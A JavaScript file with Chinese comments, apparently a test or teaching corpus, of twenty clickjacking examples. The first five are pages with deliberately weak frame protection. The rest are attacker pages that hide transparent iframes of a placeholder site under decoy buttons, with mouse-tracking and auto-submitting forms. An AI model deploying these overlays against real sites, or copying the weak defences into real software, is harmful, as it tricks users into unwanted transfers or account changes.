// Clickjacking 漏洞示例文件

// 示例 1: 缺少 X-Frame-Options 头
export function clickjackingExample1() {
  // 危险：没有任何防御点击劫持的措施
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Vulnerable Page - No Frame Protection</title>
      <!-- 危险：没有设置 X-Frame-Options 或 Content-Security-Policy -->
    </head>
    <body>
      <h1>敏感操作页面</h1>
      <button onclick="performAction()">点击我</button>
      <form id="sensitiveForm" action="/delete-account" method="POST">
        <input type="hidden" name="confirm" value="true">
        <button type="submit">删除账户</button>
      </form>
      
      <script>
        function performAction() {
          alert('敏感操作被执行!');
        }
      </script>
    </body>
    </html>
  `;
}

// 示例 2: 使用不安全的 frame-busting 代码
export function clickjackingExample2() {
  // 危险：容易被绕过的 frame busting
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Weak Frame Busting</title>
      <script>
        // 危险：简单的 frame busting，容易被绕过
        if (window.top !== window.self) {
          window.top.location = window.self.location;
        }
      </script>
    </head>
    <body>
      <h1>点击劫持易受攻击页面</h1>
      <p>这是一个敏感操作页面</p>
      <button id="actionButton" style="position: absolute; top: 100px; left: 100px;">点击执行操作</button>
      <form action="/transfer-money" method="POST" style="position: absolute; top: 150px; left: 100px;">
        <input type="hidden" name="amount" value="1000">
        <input type="hidden" name="toAccount" value="hacker_account">
        <button type="submit">转账</button>
      </form>
    </body>
    </html>
  `;
}

// 示例 3: 可被禁用的 JavaScript 防御
export function clickjackingExample3() {
  // 危险：完全依赖 JavaScript 进行防御
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>JS-Dependent Protection</title>
      <script>
        // 危险：完全依赖 JavaScript 的防御，当 JS 被禁用时无效
        if (top.location != self.location) {
          top.location = self.location;
        }
      </script>
    </head>
    <body>
      <h1>需要 JavaScript 保护的页面</h1>
      <div style="position: absolute; top: 200px; left: 200px;">
        <button onclick="deleteProfile()">删除个人资料</button>
      </div>
      <form action="/change-email" method="POST" style="position: absolute; top: 250px; left: 200px;">
        <input type="email" name="newEmail" value="hacker@example.com" hidden>
        <button type="submit">更改邮箱</button>
      </form>
    </body>
    </html>
  `;
}

// 示例 4: 不完整的 CSP 策略
export function clickjackingExample4() {
  // 危险：CSP 策略不完整
  return {
    headers: {
      'Content-Security-Policy': "default-src 'self'"  // 危险：没有设置 frame-ancestors
    },
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <title>Incomplete CSP</title>
      </head>
      <body>
        <h1>不完整的 CSP 保护</h1>
        <div style="position: absolute; top: 300px; left: 300px;">
          <button onclick="subscribePremium()">订阅高级服务</button>
        </div>
        <form action="/cancel-subscription" method="POST" style="position: absolute; top: 350px; left: 300px;">
          <button type="submit">取消订阅</button>
        </form>
      </body>
      </html>
    `
  };
}

// 示例 5: 只允许特定域名嵌入
export function clickjackingExample5() {
  // 危险：虽然有限制，但仍可能被滥用
  return {
    headers: {
      'X-Frame-Options': 'SAMEORIGIN'  // 危险：只防外站，内站子域名可能被利用
    },
    html: `
      <!DOCTYPE html>
      <html>
      <head>
        <title>SAMEORIGIN Protection</title>
      </head>
      <body>
        <h1>SAMEORIGIN 保护页面</h1>
        <p>此页面只能在同一域名下被嵌入</p>
        <button style="position: absolute; top: 400px; left: 400px;" onclick="upgradeAccount()">升级账户</button>
        <form action="/unsubscribe-newsletter" method="POST" style="position: absolute; top: 450px; left: 400px;">
          <button type="submit">取消订阅</button>
        </form>
      </body>
      </html>
    `
  };
}

// 示例 6: 混合内容页面
export function clickjackingExample6() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Mixed Content Vulnerability</title>
    </head>
    <body>
      <h1>混合内容页面</h1>
      <iframe src="https://vulnerable-site.com/sensitive-page" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.1;"></iframe>
      <div style="position: absolute; top: 50px; left: 50px; z-index: 100;">
        <p>点击下面的按钮获取奖励：</p>
        <button>点击领取</button>
      </div>
    </body>
    </html>
  `;
}

// 示例 7: 易受攻击的拖放界面
export function clickjackingExample7() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Drag and Drop Interface</title>
    </head>
    <body>
      <h1>拖放界面</h1>
      <div id="draggable" draggable="true" style="position: absolute; top: 500px; left: 500px; width: 100px; height: 100px; background: red;">
        拖拽我
      </div>
      <form action="/sensitive-drag-operation" method="POST" style="position: absolute; top: 520px; left: 520px; width: 60px; height: 60px; opacity: 0;">
        <input type="hidden" name="action" value="sensitive_action">
        <button type="submit" style="width: 100%; height: 100%;">隐藏按钮</button>
      </form>
    </body>
    </html>
  `;
}

// 示例 8: 透明覆盖攻击
export function clickjackingExample8() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Transparent Overlay</title>
    </head>
    <body>
      <h1>正常页面内容</h1>
      <p>这是一个看起来正常的页面</p>
      
      <!-- 危险：透明覆盖层 -->
      <iframe src="https://vulnerable-site.com/action-page" 
              style="position: absolute; top: 60px; left: 60px; width: 120px; height: 40px; opacity: 0; pointer-events: none;">
      </iframe>
      
      <div style="position: absolute; top: 60px; left: 60px; z-index: 2; pointer-events: auto;">
        <button>正常按钮</button>
      </div>
    </body>
    </html>
  `;
}

// 示例 9: 多层覆盖攻击
export function clickjackingExample9() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Multi-layer Attack</title>
    </head>
    <body>
      <h1>多层点击劫持</h1>
      
      <!-- 多个透明 iframe 覆盖 -->
      <iframe src="https://vulnerable-site.com/like-button" 
              style="position: absolute; top: 100px; left: 100px; width: 80px; height: 30px; opacity: 0;"></iframe>
              
      <iframe src="https://vulnerable-site.com/follow-button" 
              style="position: absolute; top: 140px; left: 100px; width: 80px; height: 30px; opacity: 0;"></iframe>
              
      <iframe src="https://vulnerable-site.com/share-button" 
              style="position: absolute; top: 180px; left: 100px; width: 80px; height: 30px; opacity: 0;"></iframe>
              
      <!-- 伪装按钮 -->
      <div style="position: absolute; top: 100px; left: 100px;">
        <button>免费下载</button>
      </div>
      <div style="position: absolute; top: 140px; left: 100px;">
        <button>观看视频</button>
      </div>
      <div style="position: absolute; top: 180px; left: 100px;">
        <button>获取优惠</button>
      </div>
    </body>
    </html>
  `;
}

// 示例 10: 表单提交劫持
export function clickjackingExample10() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Form Submission Hijacking</title>
    </head>
    <body>
      <h1>表单提交劫持示例</h1>
      
      <iframe src="https://vulnerable-site.com/settings-page" 
              style="position: absolute; top: 220px; left: 150px; width: 300px; height: 200px; opacity: 0;"></iframe>
              
      <div style="position: absolute; top: 250px; left: 180px; z-index: 10;">
        <p>点击提交您的偏好设置：</p>
        <button>提交</button>
      </div>
    </body>
    </html>
  `;
}

// 示例 11: 触摸设备劫持
export function clickjackingExample11() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Touch Device Hijacking</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
      <h1>触摸设备点击劫持</h1>
      
      <iframe src="https://vulnerable-site.com/mobile-action" 
              style="position: absolute; top: 300px; left: 50px; width: 200px; height: 50px; opacity: 0;"></iframe>
              
      <div style="position: absolute; top: 300px; left: 50px; z-index: 5; width: 200px; height: 50px; background: green; color: white; text-align: center; line-height: 50px;">
        点击赢取大奖
      </div>
    </body>
    </html>
  `;
}

// 示例 12: 键盘事件劫持
export function clickjackingExample12() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Keyboard Event Hijacking</title>
      <script>
        document.addEventListener('keydown', function(e) {
          // 危险：键盘事件也可能被劫持
          if (e.key === 'Enter') {
            document.getElementById('hiddenForm').submit();
          }
        });
      </script>
    </head>
    <body>
      <h1>键盘事件劫持</h1>
      <p>按 Enter 键执行操作</p>
      
      <iframe src="https://vulnerable-site.com/key-sensitive" 
              style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0;"></iframe>
              
      <form id="hiddenForm" action="/key-action" method="POST" style="display: none;">
        <input type="hidden" name="action" value="key_triggered">
      </form>
    </body>
    </html>
  `;
}

// 示例 13: 复杂布局劫持
export function clickjackingExample13() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Complex Layout Hijacking</title>
      <style>
        .overlay {
          position: absolute;
          pointer-events: none;
        }
        .button-replacement {
          position: absolute;
          pointer-events: auto;
          z-index: 100;
        }
      </style>
    </head>
    <body>
      <h1>复杂布局点击劫持</h1>
      
      <!-- 多个 iframe 覆盖不同区域 -->
      <iframe src="https://vulnerable-site.com/button1" class="overlay" style="top: 400px; left: 100px; width: 100px; height: 40px;"></iframe>
      <iframe src="https://vulnerable-site.com/button2" class="overlay" style="top: 400px; left: 220px; width: 100px; height: 40px;"></iframe>
      <iframe src="https://vulnerable-site.com/form" class="overlay" style="top: 460px; left: 100px; width: 220px; height: 80px;"></iframe>
      
      <!-- 伪装界面 -->
      <div class="button-replacement" style="top: 400px; left: 100px;"> 
        <button>选项 A</button>
      </div>
      <div class="button-replacement" style="top: 400px; left: 220px;"> 
        <button>选项 B</button>
      </div>
      <div class="button-replacement" style="top: 460px; left: 100px; width: 220px; height: 80px;"> 
        <input type="text" placeholder="输入信息" style="width: 100%; height: 100%;">
      </div>
    </body>
    </html>
  `;
}

// 示例 14: 动态内容劫持
export function clickjackingExample14() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Dynamic Content Hijacking</title>
      <script>
        // 危险：动态加载的内容也可能被劫持
        function loadDynamicContent() {
          const iframe = document.createElement('iframe');
          iframe.src = 'https://vulnerable-site.com/dynamic-action';
          iframe.style.cssText = 'position: absolute; top: 600px; left: 200px; width: 150px; height: 40px; opacity: 0;';
          document.body.appendChild(iframe);
        }
        
        setTimeout(loadDynamicContent, 2000);
      </script>
    </head>
    <body>
      <h1>动态内容点击劫持</h1>
      <p>页面加载后会动态添加可劫持元素</p>
      
      <div style="position: absolute; top: 600px; left: 200px;">
        <button>动态按钮</button>
      </div>
    </body>
    </html>
  `;
}

// 示例 15: 鼠标移动跟踪劫持
export function clickjackingExample15() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Mouse Tracking Hijacking</title>
      <script>
        let mouseX = 0, mouseY = 0;
        
        document.addEventListener('mousemove', function(e) {
          mouseX = e.clientX;
          mouseY = e.clientY;
          
          // 动态调整 iframe 位置以跟随鼠标
          const iframe = document.getElementById('tracking-iframe');
          if (iframe) {
            iframe.style.top = (mouseY - 10) + 'px';
            iframe.style.left = (mouseX - 10) + 'px';
          }
        });
      </script>
    </head>
    <body>
      <h1>鼠标跟踪点击劫持</h1>
      <p>移动鼠标体验劫持效果</p>
      
      <iframe id="tracking-iframe" src="https://vulnerable-site.com/mouse-sensitive" 
              style="position: absolute; width: 20px; height: 20px; opacity: 0; pointer-events: none;"></iframe>
    </body>
    </html>
  `;
}

// 示例 16: 点击爆发攻击
export function clickjackingExample16() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Clickjacking Burst Attack</title>
    </head>
    <body>
      <h1>点击爆发攻击</h1>
      
      <!-- 快速连续的点击劫持 -->
      <iframe src="https://vulnerable-site.com/click1" style="position: absolute; top: 700px; left: 50px; width: 30px; height: 30px; opacity: 0;"></iframe>
      <iframe src="https://vulnerable-site.com/click2" style="position: absolute; top: 700px; left: 90px; width: 30px; height: 30px; opacity: 0;"></iframe>
      <iframe src="https://vulnerable-site.com/click3" style="position: absolute; top: 700px; left: 130px; width: 30px; height: 30px; opacity: 0;"></iframe>
      <iframe src="https://vulnerable-site.com/click4" style="position: absolute; top: 740px; left: 50px; width: 30px; height: 30px; opacity: 0;"></iframe>
      <iframe src="https://vulnerable-site.com/click5" style="position: absolute; top: 740px; left: 90px; width: 30px; height: 30px; opacity: 0;"></iframe>
      
      <div style="position: absolute; top: 700px; left: 50px;">
        <button>快速点击</button>
      </div>
    </body>
    </html>
  `;
}

// 示例 17: 音频/视频播放劫持
export function clickjackingExample17() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Media Playback Hijacking</title>
    </head>
    <body>
      <h1>媒体播放点击劫持</h1>
      
      <iframe src="https://vulnerable-site.com/media-controls" 
              style="position: absolute; top: 800px; left: 100px; width: 100px; height: 40px; opacity: 0;"></iframe>
              
      <div style="position: absolute; top: 800px; left: 100px;">
        <button>播放视频</button>
      </div>
      
      <audio id="hiddenAudio" style="display: none;">
        <source src="https://example.com/audio.mp3" type="audio/mpeg">
      </audio>
    </body>
    </html>
  `;
}

// 示例 18: 无障碍功能劫持
export function clickjackingExample18() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Accessibility Feature Hijacking</title>
    </head>
    <body>
      <h1>无障碍功能点击劫持</h1>
      
      <!-- 利用 aria 标签等无障碍功能进行劫持 -->
      <iframe src="https://vulnerable-site.com/accessibility-action" 
              style="position: absolute; top: 850px; left: 150px; width: 120px; height: 30px; opacity: 0;" 
              aria-label="hidden-action"></iframe>
              
      <button aria-describedby="instructions" style="position: absolute; top: 850px; left: 150px;">
        访问特殊功能
      </button>
      
      <div id="instructions" style="display: none;">
        点击按钮启用特殊功能
      </div>
    </body>
    </html>
  `;
}

// 示例 19: 移动设备特殊劫持
export function clickjackingExample19() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Mobile Specific Hijacking</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style>
        @media (max-width: 768px) {
          iframe {
            transform: scale(2); /* 放大劫持元素 */
            transform-origin: top left;
          }
        }
      </style>
    </head>
    <body>
      <h1>移动端特殊点击劫持</h1>
      
      <iframe src="https://vulnerable-site.com/mobile-specific" 
              style="position: absolute; top: 900px; left: 20px; width: 100px; height: 30px; opacity: 0;"></iframe>
              
      <div style="position: absolute; top: 900px; left: 20px;">
        <button>移动专享</button>
      </div>
    </body>
    </html>
  `;
}

// 示例 20: 复合点击劫持攻击
export function clickjackingExample20() {
  return `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Compound Clickjacking Attack</title>
      <script>
        // 组合多种点击劫持技术
        function setupAdvancedHijacking() {
          // 技术1: 动态 iframe 创建
          for (let i = 0; i < 5; i++) {
            const iframe = document.createElement('iframe');
            iframe.src = \`https://vulnerable-site.com/action-\${i}\`;
            iframe.style.cssText = \`position: absolute; top: \${1000 + i * 50}px; left: \${100 + i * 30}px; width: 80px; height: 25px; opacity: 0;\`;
            document.body.appendChild(iframe);
          }
          
          // 技术2: 鼠标跟踪
          document.addEventListener('mousemove', function(e) {
            const trackingFrame = document.getElementById('mouse-track-frame');
            if (trackingFrame) {
              trackingFrame.style.transform = \`translate(\${e.clientX}px, \${e.clientY}px)\`;
            }
          });
          
          // 技术3: 定时操作
          setInterval(function() {
            // 可能的定时劫持操作
            console.log('Periodic hijacking check');
          }, 1000);
        }
        
        window.onload = setupAdvancedHijacking;
      </script>
    </head>
    <body>
      <h1>复合点击劫持攻击</h1>
      <p>结合多种技术的高级点击劫持</p>
      
      <!-- 主要劫持区域 -->
      <div style="position: absolute; top: 1000px; left: 100px;">
        <button>复合操作</button>
      </div>
      
      <!-- 鼠标跟踪 iframe -->
      <iframe id="mouse-track-frame" src="https://vulnerable-site.com/mouse-track-action" 
              style="position: absolute; width: 30px; height: 30px; opacity: 0; pointer-events: none; z-index: 1000;"></iframe>
    </body>
    </html>
  `;
}
